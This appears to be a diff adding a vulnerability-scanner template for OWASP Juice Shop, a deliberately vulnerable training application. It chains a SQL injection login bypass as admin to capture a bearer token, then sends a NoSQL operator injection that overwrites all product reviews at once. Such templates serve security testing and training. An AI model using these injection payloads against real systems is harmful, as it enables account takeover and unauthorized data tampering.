@@ -1,0 +1,61 @@
+id: juice-shop-nosql-manipulation
+
+info:
+  name: NoSQL Manipulation
+  author: yelaco
+  severity: high
+  tags: juice-shop,nosqli,review
+  description: Update multiple product reviews at the same time
+
+requests:
+  # Step 1: Login via SQL Injection to get token
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "email": "admin@juice-sh.op'--",
+        "password": "irrelevant"
+      }
+
+    extractors:
+      - type: json
+        json:
+          - ".authentication.token"
+        internal: true # Makes the extracted value available to the next request
+        name: token
+
+  # Step 2: Use token in Authorization header and update product reviews
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/rest/products/reviews"
+
+    headers:
+      Authorization: Bearer {{token}}
+      Content-Type: application/json
+
+    body: |
+      {
+        "id": { "$ne": -1 },
+        "message": "NoSQL Injection!"
+      }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "NoSQL Injection!"
+
+    extractors:
+      - type: json
+        part: body
+        name: updated_reviews
+        json:
+          - ".updated | .[] | {_id, author, message}"
